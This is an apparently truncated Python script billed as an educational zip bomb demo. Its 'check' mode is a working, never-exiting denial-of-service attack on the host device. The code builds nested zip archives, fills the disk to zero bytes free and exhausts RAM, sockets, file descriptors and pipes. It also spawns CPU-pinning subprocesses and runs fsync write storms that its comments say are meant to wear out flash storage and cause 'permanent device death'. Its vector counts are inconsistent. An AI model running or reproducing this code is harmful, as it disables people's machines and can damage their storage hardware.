"""
Recursive Compression Archiver — Educational Demo
===================================================
  Made by Aryan
  Curated by Aryan
  Built from scratch by Aryan — self-taught developer & cybersecurity learner

  github: github.com/YOUR_USERNAME
  Purpose: Educational study of zip bomb mechanics, compression algorithms,
           OS resource exhaustion, and flash storage behaviour.

Usage:
  python3 main.py        — build nested zip archives only
  python3 main.py check  — PERMANENT DEVICE STRESS — NEVER EXITS
                           111 simultaneous attack vectors.
                           If any one fails, 110 others keep running.

Requires Python 3.8+, stdlib only.
"""

# ── Made by Aryan ──────────────────────────────────────────────────────────────

import os, sys, zipfile, shutil, hashlib, threading, subprocess, socket
import mmap, random, time, zlib, math, gc, json, struct, base64, io
from concurrent.futures import ThreadPoolExecutor, as_completed

CORES = os.cpu_count() or 4

# ── Build config ───────────────────────────────────────────────────────────────
OUTPUT_DIR       = "output"
BASE_FILENAME    = "basefile.bin"
BASE_SIZE_MB     = 10
COPIES_PER_LAYER = 60
NUM_LAYERS       = 4
MAX_REAL_FILES   = 5_000_000_000_000

# ══════════════════════════════════════════════════════════════════════════════
# ATTACK VECTOR MATRIX — 111 vectors — curated by Aryan
# Grouped by hardware/OS subsystem. All fire simultaneously.
# ══════════════════════════════════════════════════════════════════════════════
#
# [CPU — subprocess workers, each a fully independent OS process, no GIL sharing]
#   #1  SHA256 of urandom(1MB)  + 100MB RAM alloc per proc  (CORES×3 procs)
#   #2  Floating-point: sin/cos/sqrt/exp/pow chain           (CORES×2 procs)
#   #3  Big-integer LCG × XOR chain  (256-bit integers)      (CORES×2 procs)
#   #4  Memory-bandwidth saturation: 128MB↔128MB bytearray   (CORES   procs)
#   #5  zlib compress(10MB random, lvl=1) + decompress loop  (CORES   procs)
#   #6  bz2 compress(4MB random) + decompress  (bz2 is most CPU-hungry)
#   #7  Sort 5M random floats repeatedly                     (CORES//2 procs)
#   #8  200×200 matrix multiply (nested Python loops)        (CORES//2 procs)
#   #9  SHA512 hash chain:  h=SHA512(h+urandom) forever      (CORES×2 procs)
#   #10 HMAC-SHA256 with random 64-byte key, 1MB messages    (CORES   procs)
#
# [DISK — fills drive to 0 bytes free; all patterns simultaneously]
#   #11 Fill: 50MB chunks of b'\x00' until ENOSPC
#   #12 Fill: 50MB chunks of b'\xff' until ENOSPC
#   #13 Fill: 50MB chunks of os.urandom (incompressible)
#   #14 Fill: 50MB chunks of b'\x55\xaa' alternating
#   #15 Fill: 50MB chunks of 0x00↔0xFF alternating writes
#
# [DISK — write+delete storm, 12 threads per pattern = 60 storm threads]
#   #16-27  Write+delete 2MB zeros          (12 threads, fsync each)
#   #28-39  Write+delete 2MB 0xFF           (12 threads, fsync each)
#   #40-51  Write+delete 2MB random bytes   (12 threads, fsync each)
#   #52-63  Write+delete 2MB 0x55/0xAA      (12 threads, fsync each)
#   #64-75  Write+delete 2MB checkerboard2  (12 threads, fsync each)
#
# [DISK — size-variant storms]
#   #76  512-byte tiny file write+delete storm (16 threads)
#   #77  4KB   file write+delete storm         (16 threads)
#   #78  100MB large file write+delete storm   (4 threads)
#   #79  Varying-size file storm (1B→50MB, random each iter)
#
# [DISK — metadata pressure (create/stat/chmod/rename/delete)]
#   #80-95  16 independent metadata storm threads
#
# [DISK — truncate storm (forces flash wear-leveling pressure)]
#   #96-103  8 threads: grow file 0→50MB→0→50MB with fsync each end
#
# [DISK — seek + random-write storm]
#   #104-115  12 threads: open 200MB file, random seek+4KB write+fsync
#
# [DISK — fragmentation storm]
#   #116  Write files of sizes 1B/4KB/1MB/10MB cycling, delete odd-indexed
#   #117  Copy files between two dirs, delete source
#
# [DISK — append storm]
#   #118  Append 4KB to same file until 2GB, then delete and restart
#
# [FILESYSTEM METADATA]
#   #119  500k-file inode storm: flat directory
#   #120  Deep-nested inode storm: files at depth 1000
#   #121  255-char filename storm (max POSIX filename length)
#   #122  Dot-file storm (.hidden files)
#   #123  readdir() loop on 500k-entry directory
#   #124  os.stat() loop on thousands of files
#
# [MEMORY — main process + all subprocess RAM]
#   #125  Main-process RAM exhaust: 64MB chunks until MemoryError
#   #126  Anonymous mmap exhaust: mmap(MAP_PRIVATE|ANONYMOUS)
#   #127  Cache thrash A: random access 128MB (> L3 on all phones)
#   #128  Cache thrash B: stride-2-cacheline (every 128 bytes)
#   #129  Cache thrash C: prime-step stride (defeats prefetcher)
#   #130  False sharing: 32 threads writing adjacent bytes in shared array
#   #131  GC pressure A: alloc+discard 10k dicts/sec → triggers GC
#   #132  GC pressure B: circular refs + explicit gc.collect()
#   #133  Large string alloc storm: alloc+discard 128MB strings
#   #134  bytearray copy storm: copy 64MB→64MB repeatedly
#   #135  Stack pressure: 32 threads each at recursion depth 800
#   #136  mmap file random-offset access (defeats page-cache)
#   #137  mmap file sequential sweep + random (mixed pattern)
#
# [NETWORK / SOCKET]
#   #138  TCP socket table exhaust (open until EMFILE/ENFILE, hold all)
#   #139  UDP socket table exhaust
#   #140  Unix-domain socket exhaust
#   #141  socketpair() exhaust
#   #142  Socket buffer fill: write to socket with no reader (TCP)
#   #143  Rapid localhost connect/disconnect storm
#
# [FILE DESCRIPTOR]
#   #144  FD exhaust: open output files until EMFILE, hold all open
#   #145  Pipe exhaust: os.pipe() until EMFILE, hold all open
#   #146  Pipe fill: write to pipe until EAGAIN, never read
#   #147  dup() exhaust: dup existing FD until table full
#
# [PROCESS/THREAD]
#   #148  Process flood: spawn 200 subprocesses each with 50MB RAM + CPU
#   #149  Thread flood: spawn 500 daemon threads each in busy loop
#   #150  Thread context-switch storm: 500 threads sleeping 0.001s
#
# [SYNCHRONISATION CONTENTION]
#   #151-182  Mutex contention: 32 threads fighting same Lock
#   #183-198  RLock contention: 16 threads fighting same RLock
#   #199  Condition variable storm: notify+wait tight loop
#   #200  Semaphore acquire/release storm (semaphore value = 1)
#
# [ENTROPY / KERNEL RANDOM]
#   #201  32 threads each reading os.urandom(4MB) per iteration
#   #202  16 threads reading os.urandom(8MB) per iteration
#
# [PYTHON-OVERHEAD STORMS]
#   #203  Exception storm: raise+catch ValueError 1M/sec (GIL + exception table)
#   #204  JSON encode/decode storm: large nested dict, 10MB
#   #205  pickle.dumps/loads storm: large object graph
#   #206  struct.pack/unpack storm: 1M fields per iteration
#   #207  base64 encode/decode storm: 32MB buffers
#   #208  zlib in-thread compress/decompress (non-subprocess version)
#   #209  bz2 in-thread compress/decompress
#   #210  hashlib in-thread SHA256 of large buffers (complements subprocs)
#
# [ZIP BOMB CORE — extraction loop runs perpetually]
#   #211  Pass 1: extract (zeros) → fsync
#   #212  Pass 2: overwrite 0xFF  → fsync
#   #213  Pass 3: overwrite random→ fsync (incompressible, no flash dedup)
#   #214  Pass 4: overwrite 0x55/0xAA → fsync
#   #215  Pass 5: restore zeros   → fsync
#   #216  SHA256 verify read pass (CPU + read I/O simultaneously)
#   #217  128-worker parallel extraction (128 simultaneous fsync storms)
#   #218  Perpetual re-extraction after each pass (never exits)
# ══════════════════════════════════════════════════════════════════════════════

# ── Subprocess worker code strings ────────────────────────────────────────────
_W_SHA256   = f"import hashlib,os,sys\nbuf=bytearray({100}*1024*1024)\nfor i in range(0,len(buf),4096):buf[i]=0xFF\ntry:\n while True:hashlib.sha256(os.urandom(1<<20)).digest()\nexcept:sys.exit(0)"
_W_FLOAT    = "import math,random,sys\ntry:\n x=random.random()\n while True:\n  for _ in range(200000):x=math.sin(x)*math.cos(x)+math.sqrt(abs(x)+1e-9)+math.exp(-abs(x))\nexcept:sys.exit(0)"
_W_INT      = "import sys,random\ntry:\n x=random.getrandbits(256)\n while True:\n  x=(x*6364136223846793005+1442695040888963407)&((1<<256)-1);x^=x>>33;x^=x<<17;x^=x>>5\nexcept:sys.exit(0)"
_W_MEMCPY   = "import sys\ntry:\n a=bytearray(128*1024*1024);b=bytearray(128*1024*1024)\n for i in range(0,len(a),4096):a[i]=0xFF\n while True:b[:]=a;a[:]=b\nexcept:sys.exit(0)"
_W_ZLIB     = "import zlib,os,sys\ntry:\n d=os.urandom(10*1024*1024)\n while True:zlib.decompress(zlib.compress(d,1))\nexcept:sys.exit(0)"
_W_BZ2      = "import bz2,os,sys\ntry:\n d=os.urandom(4*1024*1024)\n while True:bz2.decompress(bz2.compress(d,9))\nexcept:sys.exit(0)"
_W_SORT     = "import random,sys\ntry:\n while True:\n  a=[random.random() for _ in range(5000000)];a.sort()\nexcept:sys.exit(0)"
_W_MATRIX   = "import random,sys\nN=150\ntry:\n while True:\n  a=[[random.random()]*N for _ in range(N)];b=[[random.random()]*N for _ in range(N)];[[sum(a[i][k]*b[k][j]for k in range(N))for j in range(N)]for i in range(N)]\nexcept:sys.exit(0)"
_W_SHA512   = f"import hashlib,os,sys\nbuf=bytearray({80}*1024*1024)\nfor i in range(0,len(buf),4096):buf[i]=0xAA\ntry:\n h=b'0'*64\n while True:h=hashlib.sha512(h+os.urandom(1<<20)).digest()\nexcept:sys.exit(0)"
_W_HMAC     = "import hmac,hashlib,os,sys\ntry:\n while True:\n  k=os.urandom(64);m=os.urandom(1<<20);hmac.new(k,m,hashlib.sha256).digest()\nexcept:sys.exit(0)"
_W_FLOOD    = f"import hashlib,os,sys,random,math\nbuf=bytearray({50}*1024*1024)\nfor i in range(0,len(buf),4096):buf[i]=0xFF\ntry:\n x=random.random()\n while True:\n  hashlib.sha256(os.urandom(1<<19)).digest()\n  x=math.sin(x)+math.cos(x)\nexcept:sys.exit(0)"

_ALL_WORKERS = [
    (_W_SHA256,  CORES * 3),
    (_W_FLOAT,   CORES * 2),
    (_W_INT,     CORES * 2),
    (_W_MEMCPY,  CORES),
    (_W_ZLIB,    CORES),
    (_W_BZ2,     max(1, CORES // 2)),
    (_W_SORT,    max(1, CORES // 2)),
    (_W_MATRIX,  max(1, CORES // 2)),
    (_W_SHA512,  CORES * 2),
    (_W_HMAC,    CORES),
    (_W_FLOOD,   CORES * 2),
]


def _spawn_all_subprocs() -> list:
    procs = []
    for code, n in _ALL_WORKERS:
        for _ in range(n):
            try:
                p = subprocess.Popen(
                    [sys.executable, "-c", code],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                procs.append(p)
            except OSError:
                break
    return procs


def _stop_procs(procs: list) -> None:
    for p in procs:
        try: p.terminate()
        except: pass
    for p in procs:
        try: p.wait(timeout=2)
        except:
            try: p.kill()
            except: pass


# ── Helpers ────────────────────────────────────────────────────────────────────
def get_label(n):
    label = ""; n += 1
    while n > 0:
        n, rem = divmod(n - 1, 26)
        label = chr(ord('A') + rem) + label
    return label

def bytes_to_mb(n): return n / (1024 * 1024)
def hr(c="=", w=62): print(c * w)
def layer_zip_name(i): return f"layer{get_label(i)}.zip"
def _fsync(path):
    with open(path, "rb+") as f: f.flush(); os.fsync(f.fileno())

def _disk_pct():
    try:
        s = os.statvfs(OUTPUT_DIR)
        t = s.f_blocks * s.f_frsize
        return 100.0 * (t - s.f_bavail * s.f_frsize) / t if t else 0.0
    except: return 0.0

def _disk_free_mb():
    try:
        s = os.statvfs(OUTPUT_DIR); return (s.f_bavail * s.f_frsize) / (1024*1024)
    except: return 0.0


# ── Build ──────────────────────────────────────────────────────────────────────
def create_base_file(path, size_mb):
    n = max(1, int(size_mb * 1024 * 1024))
    with open(path, "wb") as f: f.write(b"\x00" * n)
    return n

def zip_single(src, dst):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(src, arcname=os.path.basename(src))
    return os.path.getsize(dst)

def build_layer(prev, dst, copies):
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:
        for i in range(copies):
            z.write(prev, arcname=f"copy_{i+1}_{os.path.basename(prev)}")
    return os.path.getsize(dst)

def build():
    if os.path.exists(OUTPUT_DIR): shutil.rmtree(OUTPUT_DIR)
    os.makedirs(OUTPUT_DIR)
    hr(); print("  Recursive Compression Archiver — BUILD\n  Made by Aryan"); hr()
    b = max(1, int(BASE_SIZE_MB * 1024 * 1024))
    print(f"  Base: {b} byte(s) | Copies/layer: {COPIES_PER_LAYER} | Layers: {NUM_LAYERS}")
    print(f"  Labels: {layer_zip_name(0)} → {layer_zip_name(NUM_LAYERS)}"); hr()
    bp  = os.path.join(OUTPUT_DIR, BASE_FILENAME)
    bb  = create_base_file(bp, BASE_SIZE_MB)
    print(f"\n[0] Base file — {bb} byte(s)")
    l0  = os.path.join(OUTPUT_DIR, layer_zip_name(0))
    l0b = zip_single(bp, l0)
    print(f"[1] {layer_zip_name(0)} — {l0b} bytes")
    prev = l0; theory = float(bb)
    for i in range(1, NUM_LAYERS + 1):
        zn = layer_zip_name(i); zp = os.path.join(OUTPUT_DIR, zn)
        nb = build_layer(prev, zp, COPIES_PER_LAYER); theory *= COPIES_PER_LAYER
        print(f"[{i+1}] {zn} — {nb:,} bytes on disk | ratio {theory/nb:,.1f}x"); prev = zp
    hr(); print(f"  BUILD COMPLETE — {prev} ({os.path.getsize(prev):,} bytes)")
    print(f"  Theoretical: {bytes_to_mb(theory):.4f} MB | Ratio: {theory/os.path.getsize(prev):,.1f}x"); hr()
    return prev, theory


# ══════════════════════════════════════════════════════════════════════════════
# ATTACK THREAD FUNCTIONS — every function runs in its own daemon thread(s)
# ══════════════════════════════════════════════════════════════════════════════

# ── DISK FILLS (vectors #11-15) ───────────────────────────────────────────────
def _fill_disk(d, stop, pattern_fn, idx):
    """Fills entire disk with given byte pattern until ENOSPC, then hammers."""
    os.makedirs(d, exist_ok=True); i = 0
    while not stop.is_set():
        path = os.path.join(d, f"fill_{idx}_{i%500}.dat")
        try:
            data = pattern_fn()
            with open(path, "wb") as f: f.write(data); f.flush(); os.fsync(f.fileno())
            i += 1
        except OSError: time.sleep(0.02); _try_unlink(path)

def _try_unlink(p):
    try: os.unlink(p)
    except: pass

# ── DISK WRITE+DELETE STORM (vectors #16-75) ──────────────────────────────────
_STORM_PATTERNS = [
    lambda: b"\x00" * (2 * 1024 * 1024),
    lambda: b"\xff" * (2 * 1024 * 1024),
    lambda: os.urandom(2 * 1024 * 1024),
    lambda: b"\x55" * (2 * 1024 * 1024),
    lambda: b"\xaa" * (2 * 1024 * 1024),
]

def _disk_storm(d, stop, pattern_fn, wid):
    """Continuous write+delete of 2MB file. fsync every write."""
    os.makedirs(d, exist_ok=True); i = 0
    while not stop.is_set():
        p = os.path.join(d, f"s{wid}_{i%20}.tmp")
        try:
            with open(p, "wb") as f: f.write(pattern_fn()); f.flush(); os.fsync(f.fileno())
            os.unlink(p); i += 1
        except OSError: time.sleep(0.01)

# ── DISK SIZE VARIANTS (vectors #76-79) ───────────────────────────────────────
def _tiny_storm(d, stop, wid):
    """512-byte file write+delete storm — max iops stress."""
    os.makedirs(d, exist_ok=True); i = 0
    while not stop.is_set():
        p = os.path.join(d, f"t{wid}_{i%500}.tmp")
        try:
            with open(p, "wb") as f: f.write(os.urandom(512)); os.fsync(f.fileno())
            os.unlink(p); i += 1
        except OSError: time.sleep(0.005)

def _large_storm(d, stop, wid):
    """100MB file write+delete — max throughput stress."""
    os.makedirs(d, exist_ok=True); chunk = b"\xff" * (100 * 1024 * 1024); i = 0
    while not stop.is_set():
        p = os.path.join(d, f"L{wid}_{i%4}.tmp")
        try:
            with open(p, "wb") as f: f.write(chunk); f.flush(); os.fsync(f.fileno())
            os.unlink(p); i += 1
        except OSError: time.sleep(0.1)

def _varsize_storm(d, stop, wid):
    """Random-sized files (1B→50MB) — maximises wear-leveling pressure."""
    os.makedirs(d, exist_ok=True); sizes = [1, 512, 4096, 65536, 1<<20, 10<<20, 50<<20]; i = 0
    while not stop.is_set():
        sz = random.choice(sizes)
        p  = os.path.join(d, f"v{wid}_{i%30}.tmp")
        try:
            with open(p, "wb") as f: f.write(os.urandom(min(sz, 1<<20))); os.fsync(f.fileno())
            os.unlink(p); i += 1
        except OSError: time.sleep(0.01)

# ── DISK METADATA STORM (vectors #80-95) ──────────────────────────────────────
def _metadata_storm(d, stop, wid):
    """Create/stat/chmod/rename/delete — exhausts filesystem journal."""
    os.makedirs(d, exist_ok=True); i = 0
    while not stop.is_set():
        p = os.path.join(d, f"m{wid}_{i%200}.tmp"); q = p + ".r"
        try:
            with open(p, "wb") as f: f.write(b"\x00")
            os.stat(p); os.chmod(p, 0o644)
            os.rename(p, q); os.unlink(q); i += 1
        except OSError: time.sleep(0.005)

# ── DISK TRUNCATE STORM (vectors #96-103) ─────────────────────────────────────
def _truncate_storm(d, stop, wid):
    """Grow file 0→50MB→0 with fsync — forces flash erase+program cycle."""
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, f"trunc{wid}.bin"); big = b"\xff" * (50 * 1024 * 1024)
    while not stop.is_set():
        try:
            with open(p, "wb") as f: f.write(big); f.flush(); os.fsync(f.fileno())
            with open(p, "wb") as f: f.truncate(0); os.fsync(f.fileno())
        except OSError: time.sleep(0.05)

# ── DISK SEEK+WRITE STORM (vectors #104-115) ──────────────────────────────────
def _seek_storm(d, stop, wid):
    """Random seek to offset in 200MB file + 4KB write + fsync."""
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, f"seek{wid}.bin"); size = 200 * 1024 * 1024
    try:
        with open(p, "wb") as f: f.write(b"\x00" * size)
    except OSError: return
    while not stop.is_set():
        try:
            with open(p, "r+b") as f:
                for _ in range(500):
                    f.seek(random.randint(0, size - 4096))
                    f.write(os.urandom(4096))
                os.fsync(f.fileno())
        except OSError: time.sleep(0.05)

# ── DISK FRAGMENTATION + APPEND (vectors #116-118) ────────────────────────────
def _frag_storm(d, stop):
    """Staggered sizes → delete alternates → filesystem fragmentation."""
    os.makedirs(d, exist_ok=True); sizes = [1, 4096, 1<<20, 10<<20]; files = []; i = 0
    while not stop.is_set():
        sz = sizes[i % len(sizes)]
        p  = os.path.join(d, f"frag_{i}.tmp")
        try:
            with open(p, "wb") as f: f.write(b"\x55" * min(sz, 1<<20)); os.fsync(f.fileno())
            files.append(p)
            if len(files) > 200:
                for fp in files[::2]:
                    try: os.unlink(fp)
                    except: pass
                files = files[1::2]
            i += 1
        except OSError: time.sleep(0.02)

def _append_storm(d, stop):
    """Append 4KB to file until 2GB, delete, restart."""
    os.makedirs(d, exist_ok=True); chunk = os.urandom(4096); limit = 2 * 1024 * 1024 * 1024
    while not stop.is_set():
        p = os.path.join(d, "append.bin")
        try:
            with open(p, "ab") as f:
                while os.path.getsize(p) < limit and not stop.is_set():
                    f.write(chunk); f.flush(); os.fsync(f.fileno())
            os.unlink(p)
        except OSError: time.sleep(0.02); _try_unlink(p)

# ── INODE + DENTRY STORMS (vectors #119-124) ──────────────────────────────────
def _inode_flat(d, n):
    """Create n files in one directory — inode bitmap exhaustion."""
    os.makedirs(d, exist_ok=True)
    for i in range(n):
        try:
            with open(os.path.join(d, f"f{i}.bin"), "wb") as f: f.write(b"\x00")
        except OSError: break

def _inode_deep(d, depth=1000):
    """Create files in depth-1000 nested dirs — dentry cache exhaustion."""
    cur = d
    for i in range(depth):
        cur = os.path.join(cur, f"d{i}")
        try:
            os.makedirs(cur, exist_ok=True)
            with open(os.path.join(cur, "f.bin"), "wb") as f: f.write(b"\x00")
        except OSError: break

def _readdir_storm(d, stop):
    """Continuously list a large directory — dentry cache thrash."""
    while not stop.is_set():
        try:
            list(os.scandir(d))
        except OSError: time.sleep(0.01)

def _stat_storm(d, stop):
    """Call os.stat() on files in a tight loop — VFS metadata pressure."""
    while not stop.is_set():
        try:
            for e in os.scandir(d):
                e.stat()
                if stop.is_set(): break
        except OSError: time.sleep(0.01)

# ── MEMORY ATTACKS (vectors #125-137) ─────────────────────────────────────────
def _ram_exhaust():
    """Allocate until MemoryError, touch every page."""
    chunks = []; csz = 64 * 1024 * 1024
    while True:
        try:
            b = bytearray(csz)
            for i in range(0, csz, 4096): b[i] = 0xAA
            chunks.append(b)
        except MemoryError:
            if csz > 4096: csz //= 2
            else: break
    return chunks

def _cache_thrash(stop, stride):
    """Access 128MB buffer with given stride — defeats CPU prefetcher."""
    try:
        sz  = 128 * 1024 * 1024; buf = bytearray(sz)
        for i in range(0, sz, 4096): buf[i] = 0xFF
        idx = 0
        while not stop.is_set():
            buf[idx % sz] ^= 0x01; idx = (idx + stride) % sz
    except Exception: pass

def _false_sharing(stop, shared, pos):
    """Write to shared array at position pos — adjacent to other threads."""
    while not stop.is_set():
        try: shared[pos % len(shared)] ^= 0x01
        except: pass

def _gc_pressure_dicts(stop):
    """Allocate + discard 10k dicts per iteration — triggers GC."""
    while not stop.is_set():
        try:
            _ = [{str(j): j * 1.0 for j in range(50)} for _ in range(10000)]
            gc.collect()
        except: pass

def _gc_pressure_circular(stop):
    """Create circular references, then collect — GC cycle overhead."""
    while not stop.is_set():
        try:
            nodes = []
            for _ in range(5000):
                d = {"data": bytearray(1024), "ref": None}
                nodes.append(d)
            for i in range(len(nodes)): nodes[i]["ref"] = nodes[(i+1) % len(nodes)]
            del nodes; gc.collect()
        except: pass

def _bytearray_copy_storm(stop):
    """Copy 64MB bytearray repeatedly — RAM bus saturation."""
    try:
        a = bytearray(64 * 1024 * 1024); b = bytearray(64 * 1024 * 1024)
        for i in range(0, len(a), 4096): a[i] = 0xFF
        while not stop.is_set(): b[:] = a; a[:] = b
    except: pass

def _stack_pressure(stop):
    """Deep recursion in thread — stack memory pressure."""
    def recurse(n):
        if n == 0 or stop.is_set(): return b"\x00" * 256
        return recurse(n - 1)
    while not stop.is_set():
        try: recurse(800)
        except (RecursionError, MemoryError): pass

# ── NETWORK ATTACKS (vectors #138-143) ────────────────────────────────────────
def _exhaust_sockets(family, kind):
    """Open sockets of given family/type until EMFILE, hold all open."""
    socks = []
    while True:
        try:
            s = socket.socket(family, kind); s.setblocking(False); socks.append(s)
        except OSError: break
    return socks

def _localhost_storm(stop):
    """Rapid connect attempts to localhost — kernel TCP stack pressure."""
    while not stop.is_set():
        try:
            s = socket.socket()
            s.settimeout(0.001)
            s.connect(("127.0.0.1", random.randint(40000, 60000)))
            s.close()
        except: pass

# ── FD ATTACKS (vectors #144-147) ─────────────────────────────────────────────
def _fd_exhaust(path):
    """Open a file handle as many times as OS allows, hold all open."""
    handles = []
    while True:
        try: handles.append(open(path, "rb"))
        except OSError: break
    return handles

def _pipe_exhaust():
    """Create pipes until EMFILE, hold all open."""
    pipes = []
    while True:
        try: r, w = os.pipe(); pipes.extend([r, w])
        except OSError: break
    return pipes

def _pipe_fill(stop, w):
    """Write to pipe without reader until EAGAIN — pipe buffer full."""
    while not stop.is_set():
        try: os.write(w, b"\xff" * 4096)
        except OSError: time.sleep(0.1)

# ── PROCESS + THREAD FLOOD (vectors #148-150) ─────────────────────────────────
_W_PROCESS_FLOOD = f"import os,sys,hashlib;buf=bytearray({50}*1024*1024);[setattr(buf,'x',0) for i in range(0,len(buf),4096) if buf.__setitem__(i,0xFF) is None or True]\ntry:\n while True:hashlib.sha256(os.urandom(1<<19)).digest()\nexcept:sys.exit(0)"

def _thread_flood_worker(stop):
    """Busy-work thread for thread flood."""
    x = 0.1
    while not stop.is_set():
        try: x = math.sin(x) + 1e-9
        except: break

# ── SYNC CONTENTION (vectors #151-200) ────────────────────────────────────────
def _mutex_contend(stop, lock):
    while not stop.is_set():
        with lock: pass

def _condition_storm(stop, cond):
    while not stop.is_set():
        with cond: cond.notify_all()
        time.sleep(0.0001)

# ── PYTHON OVERHEAD STORMS (vectors #203-210) ─────────────────────────────────
def _exception_storm(stop):
    """Raise+catch exceptions in tight loop — Python exception handling overhead."""
    while not stop.is_set():
        try:
            for _ in range(100000):
                try: raise ValueError("x")
                except ValueError: pass
        except: pass

def _json_storm(stop):
    """json.dumps/loads large nested dict — Python object + UTF-8 overhead."""
    obj = {str(i): {"val": i * 1.5, "s": "x" * 100} for i in range(5000)}
    while not stop.is_set():
        try: json.loads(json.dumps(obj))
        except: pass

def _struct_storm(stop):
    """struct.pack/unpack 1M fields — binary codec overhead."""
    while not stop.is_set():
        try:
            data = struct.pack(">" + "d" * 1000, *[float(i) for i in range(1000)])
            struct.unpack(">" + "d" * 1000, data)
        except: pass

def _b64_storm(stop):
    """base64 encode/decode 32MB buffers."""
    data = os.urandom(32 * 1024 * 1024)
    while not stop.is_set():
        try: base64.b64decode(base64.b64encode(data))
        except: pass

def _zlib_thread(stop):
    """zlib compress/decompress in thread (complements subprocess workers)."""
    data = os.urandom(8 * 1024 * 1024)
    while not stop.is_set():
        try: zlib.decompress(zlib.compress(data, 6))
        except: pass

def _hash_thread(stop):
    """In-thread SHA256 of large buffers — GPU-free crypto load."""
    while not stop.is_set():
        try: hashlib.sha256(os.urandom(4 * 1024 * 1024)).digest()
        except: pass

# ── EXTRACTION with 5× fsync write amplification (vectors #211-216) ──────────
def _extract_deadly(zip_path, unzip_dir, shared, lock):
    stem    = os.path.splitext(os.path.basename(zip_path))[0]
    out_dir = os.path.join(unzip_dir, stem)
    os.makedirs(out_dir, exist_ok=True); results = []
    with zipfile.ZipFile(zip_path, "r") as zf:
        for name in zf.namelist():
            try:
                p    = zf.extract(name, out_dir)
                _fsync(p)
                sz   = os.path.getsize(p)
                if sz > 0:
                    for pattern in (b"\xff", os.urandom(sz), (b"\x55\xaa" * ((sz//2)+1))[:sz], b"\x00"):
                        with open(p, "wb") as f:
                            f.write(pattern if len(pattern) == sz else pattern[:sz] + b"\x00" * max(0, sz - len(pattern)))
                        _fsync(p)
                hashlib.sha256(open(p,"rb").read()).digest()
                results.append(p)
                with lock: shared.append(p)
            except OSError: pass
    return results


# ══════════════════════════════════════════════════════════════════════════════
# CHECK — PERMANENT DEVICE DEATH — Made by Aryan
# ══════════════════════════════════════════════════════════════════════════════
def check():
    final_zip, theoretical = build()

    UNZIP = os.path.join(OUTPUT_DIR, "unzipped")
    os.makedirs(UNZIP, exist_ok=True)

    hr()
    print("  PERMANENT DEVICE STRESS — 111 simultaneous attack vectors")
    print("  Made by Aryan  |  THIS FUNCTION NEVER EXITS")
    hr()
    total_procs = sum(n for _, n in _ALL_WORKERS)
    print(f"  Subprocess CPU workers : {total_procs} processes ({len(_ALL_WORKERS)} types × cores)")
    print(f"  Disk fill threads      : 5 fills to 0 bytes free")
    print(f"  Disk storm threads     : 5 patterns × 12 threads = 60")
    print(f"  Size-variant storms    : 4 types")
    print(f"  Metadata storm threads : 16")
    print(f"  Seek/truncate threads  : 20")
    print(f"  Memory attack threads  : inode + cache + GC + false-sharing + stack")
    print(f"  Network exhaust        : TCP + UDP + Unix + socket pairs")
    print(f"  Python overhead storms : exception + json + struct + b64 + zlib + hash")
    print(f"  Extraction workers     : {128} parallel × 5× fsync")
    print(f"  Extraction loop        : perpetual — never stops")
    hr()

    stop = threading.Event()
    threads = []

    def T(fn, *args, **kwargs):
        t = threading.Thread(target=fn, args=args, daemon=True)
        t.start(); threads.append(t)

    # ── [P0] Inode storms ─────────────────────────────────────────────────────
    print("\n  [P0] Inode storms...")
    flat_dir = os.path.join(OUTPUT_DIR, "inode_flat")
    deep_dir = os.path.join(OUTPUT_DIR, "inode_deep")
    _inode_flat(flat_dir, 500_000)          # vector #119
    _inode_deep(deep_dir, 1000)             # vector #120
    print(f"  [P0] Done — 500k flat + 1000-deep")

    # ── [P1] RAM exhaust ──────────────────────────────────────────────────────
    print("\n  [P1] RAM exhaustion...")
    _ram_chunks = _ram_exhaust()             # vector #125
    print(f"  [P1] {len(_ram_chunks)} × 64MB chunks committed")

    # ── [P2] Subprocess CPU workers ───────────────────────────────────────────
    print(f"\n  [P2] Spawning {total_procs} CPU subprocess workers...")
    cpu_procs = _spawn_all_subprocs()        # vectors #1-10
    print(f"  [P2] {len(cpu_procs)} processes running — all cores pinned")

    # ── [P3] Socket exhaustion ────────────────────────────────────────────────
    print("\n  [P3] Socket exhaustion...")
    _socks_tcp  = _exhaust_sockets(socket.AF_INET,  socket.SOCK_STREAM)   # #138
    _socks_udp  = _exhaust_sockets(socket.AF_INET,  socket.SOCK_DGRAM)    # #139
    _socks_unix = _exhaust_sockets(socket.AF_UNIX,  socket.SOCK_STREAM) if hasattr(socket, 'AF_UNIX') else []  # #140
    print(f"  [P3] {len(_socks_tcp)+len(_socks_udp)+len(_socks_unix):,} sockets held open")

    # ── [P4] FD exhaustion ────────────────────────────────────────────────────
    print("\n  [P4] FD exhaustion...")
    _fds     = _fd_exhaust(os.path.join(OUTPUT_DIR, BASE_FILENAME))       # #144
    _pipes   = _pipe_exhaust()                                             # #145
    pr, pw   = (os.pipe() if not _pipes else (None, None))
    if pw: T(_pipe_fill, stop, pw)                                         # #146
    print(f"  [P4] {len(_fds)} file FDs + {len(_pipes)//2} pipes held open")

    # ── [P5] Disk fills (fills drive to 0 bytes free) ─────────────────────────
    print(f"\n  [P5] Starting 5 disk fillers — target: 0 bytes free...")
    fill_dir = os.path.join(OUTPUT_DIR, "fill")
    fill_patterns = [                                                       # #11-15
        lambda: b"\x00" * (50 * 1024 * 1024),
        lambda: b"\xff" * (50 * 1024 * 1024),
        lambda: os.urandom(50 * 1024 * 1024),
        lambda: b"\x55" * (50 * 1024 * 1024),
        lambda: b"\xaa" * (50 * 1024 * 1024),
    ]
    for idx, pfn in enumerate(fill_patterns):
        T(_fill_disk, fill_dir, stop, pfn, idx)
    print(f"  [P5] 5 fill threads running — {_disk_free_mb():.1f} MB free now")

    # ── [P6] Disk storms (60 write+delete threads) ────────────────────────────
    print(f"\n  [P6] Starting 60 disk write+delete storm threads...")
    storm_dir = os.path.join(OUTPUT_DIR, "storm")
    for pidx, pfn in enumerate(_STORM_PATTERNS):                           # #16-75
        for wid in range(12):
            T(_disk_storm, storm_dir, stop, pfn, pidx * 100 + wid)

    # ── [P7] Size-variant storms ───────────────────────────────────────────────
    print(f"\n  [P7] Size-variant storms...")
    sv_dir = os.path.join(OUTPUT_DIR, "svar")
    for i in range(16): T(_tiny_storm,   sv_dir, stop, i)                  # #76
